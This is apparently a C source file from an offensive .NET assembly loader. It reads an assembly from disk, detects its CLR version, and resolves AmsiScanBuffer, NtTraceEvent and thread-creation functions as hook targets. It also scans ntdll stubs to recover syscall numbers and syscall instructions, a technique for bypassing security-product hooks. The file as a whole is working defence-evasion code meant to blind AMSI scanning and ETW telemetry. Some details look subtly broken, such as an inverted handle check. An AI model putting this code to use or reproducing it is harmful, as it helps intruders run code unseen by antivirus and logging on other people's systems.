#include <windows.h>

#include "SharpStruct.h"
#include "Structs.h"

#define	UP		500
#define	DOWN	500

const char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
const char v2[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };

const wchar_t wClrV2A[] = L"v2.0.50727";
const wchar_t wClrV4A[] = L"v4.0.30319";

BOOL ReadFileFromDisk(
	_In_		LPCSTR	lpFilePath,
	_Inout_		PVOID* pAddr,
	_Inout_		PDWORD	dwSize
)
{
	BOOL ret = FALSE;
	HANDLE hFile = NULL;

	DWORD size;

	hFile = CreateFileA(lpFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		goto exit;
	}

	*dwSize = GetFileSize(hFile, NULL);
	if (*dwSize == 0)
	{
		goto exit;
	}

	*pAddr = malloc(*dwSize);
	RtlZeroMemory(*pAddr, *dwSize);

	if (
		ReadFile(hFile, *pAddr, *dwSize, NULL, NULL)
		)
	{
		ret = TRUE;
	}
	else
	{

		free(*pAddr);
	}

exit:
	if (!hFile) CloseHandle(hFile);
	return ret;
}

DWORD xWscmp(
	_In_	LPCWSTR		ws1,
	_In_	LPCWSTR		ws2
)
{
	while (*ws1 && (*ws1 == *ws2)) {
		ws1++;
		ws2++;
	}
	return *ws1 - *ws2;
}

clrVersion GetVersionOfClr(
	_In_	PVOID	fileContent,
	_In_	DWORD	fileSize
)
{
	for (int i = 0; i < (fileSize - sizeof(v4)); i++) {
		if (RtlCompareMemory(((PBYTE)fileContent + i), v4, sizeof(v4)) == sizeof(v4)) {
			return CLR_V4;
		}
		else if (RtlCompareMemory(((PBYTE)fileContent + i), v2, sizeof(v2)) == sizeof(v2)) {
			return CLR_V2;
		}
		else {
			continue;
		}
	}

}

BOOL CheckIfClrIsLoaded(
	_In_	clrVersion			version,
	_In_	IEnumUnknown* pEnumerator,
	_In_	ICLRRuntimeInfo* pRuntimeInfo
)
{
	WCHAR wszVersion[100];
	DWORD cchVersion = 100;
	IUnknown* pUnk = NULL;
	BOOL _found = FALSE;
	HRESULT hr;

	while (pEnumerator->lpVtbl->Next(pEnumerator, 1, &pUnk, NULL) == S_OK)
	{

		hr = pUnk->lpVtbl->QueryInterface(pUnk, &IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);

		if (SUCCEEDED(hr)) {
			hr = pRuntimeInfo->lpVtbl->GetVersionString(pRuntimeInfo, wszVersion, &cchVersion);

			if (version == CLR_V2)
			{
				if (xWscmp(wszVersion, wClrV2A) == 0) {
					return TRUE;
				}
			}

			else if (version == CLR_V4)
			{
				if (xWscmp(wszVersion, wClrV4A) == 0) {
					return TRUE;
				}
			}

			else
			{
				return FALSE;
			}
		}
	}

	return FALSE;
}

SAFEARRAY* prepareArgs(
	_In_	LPWSTR		lpwArgs
)
{
	VARIANT				args = { 0 };
	SAFEARRAYBOUND		paramsBound = { 1, 0 };
	LONG				index = 0;
	DWORD				dwArgsSize = 0;
	SAFEARRAY* params = NULL;
	LPWSTR* lpwCliArgs = NULL;
	HRESULT				hRes = S_OK;

	lpwCliArgs = CommandLineToArgvW(lpwArgs, &dwArgsSize);

	args.vt = VT_ARRAY | VT_BSTR;
	SAFEARRAYBOUND sab = { (ULONG)dwArgsSize, 0 };
	args.parray = SafeArrayCreate(VT_BSTR, 1, &sab);

	for (int i = 0; i < dwArgsSize; i++) {
		BSTR bstr = SysAllocString(lpwCliArgs[i]);
		hRes = SafeArrayPutElement(args.parray, (LONG*)&i, bstr);
		if (FAILED(hRes))
			return NULL;
		SysFreeString(bstr);
	}

	params = SafeArrayCreate(VT_VARIANT, 1, &paramsBound);

	hRes = SafeArrayPutElement(params, &index, &args);
	if (FAILED(hRes))
		return NULL;

	VariantClear(&args);

	return params;
}

BOOL SolveHookAddr(
	_In_	PHOOK_ADDR	hookList
)
{
	HMODULE	hModAmsi	= LoadLibraryA("amsi.dll");
	HMODULE	hModNtdll	= LoadLibraryA("Ntdll.dll");
	HMODULE	hModKBase	= GetModuleHandleA("Kernelbase.dll");

	if (!hModAmsi || !hModNtdll || !hModKBase)
		return FALSE;

	hookList->AmsiScanBuffer			= GetProcAddress(hModAmsi, "AmsiScanBuffer");
	hookList->NtTraceEvent				= GetProcAddress(hModNtdll, "NtTraceEvent");
	hookList->NtCreateThreadEx			= GetProcAddress(hModNtdll, "NtCreateThreadEx");
	hookList->NtCreateWorkerFactory		= GetProcAddress(hModNtdll, "NtCreateWorkerFactory");
	hookList->QueueUserWorkItem			= GetProcAddress(hModNtdll, "RtlQueueWorkItem");

	if (
		!hookList->AmsiScanBuffer			||
		!hookList->NtTraceEvent				||
		!hookList->NtCreateThreadEx			||
		!hookList->NtCreateWorkerFactory	||
		!hookList->QueueUserWorkItem
		)
		return FALSE;

	return TRUE;
}

DWORD64 dwFindRetInstruction(
	_In_	DWORD64		dwAddr
)
{
	for (int i = 0; ;i++)
	{
		if (
			((PBYTE)dwAddr + i)[0] == 0xC3
			)
		{
			return (DWORD64)(dwAddr + i);
		}
	}

	return 0;
}

PVOID GetSyscallInstruction(
	_In_	PVOID	searchAddr
)
{
	for (int i = 0; i < 500; i++)
	{
		if (
			((PBYTE)searchAddr + i)[0] == 0x0F &&
			((PBYTE)searchAddr + i)[1] == 0x05
			)
		{
			return (PVOID)((PBYTE)searchAddr + i);
		}
	}
	return NULL;
}

BOOL GetSyscall(
	_In_	PVOID		pFunctionAddress, 
	_In_	PSYS_INFO	sysInfo
)
{
	if (*((PBYTE)pFunctionAddress) == 0x4c
		&& *((PBYTE)pFunctionAddress + 1) == 0x8b
		&& *((PBYTE)pFunctionAddress + 2) == 0xd1
		&& *((PBYTE)pFunctionAddress + 3) == 0xb8
		&& *((PBYTE)pFunctionAddress + 6) == 0x00
		&& *((PBYTE)pFunctionAddress + 7) == 0x00) {

		BYTE high = *((PBYTE)pFunctionAddress + 5);
		BYTE low = *((PBYTE)pFunctionAddress + 4);
		sysInfo->syscall = (high << 8) | low;
		sysInfo->pAddress = GetSyscallInstruction(pFunctionAddress);
		return TRUE;
	}
	else {
		for (WORD idx = 1; idx <= 500; idx++) {
			if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
				&& *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
				&& *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
				&& *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
				&& *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
				&& *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
				BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
				BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
				sysInfo->syscall = (high << 8) | low - idx;
				sysInfo->pAddress = GetSyscallInstruction((PBYTE)pFunctionAddress + idx * DOWN);

				return TRUE;
			}
			if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
				&& *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
				&& *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
				&& *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
				&& *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
				&& *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
				BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
				BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
				sysInfo->syscall = (high << 8) | low + idx;
				sysInfo->pAddress = GetSyscallInstruction((PBYTE)pFunctionAddress + idx * UP);

				return TRUE;
			}
		}
		return FALSE;
	}

	return FALSE;
}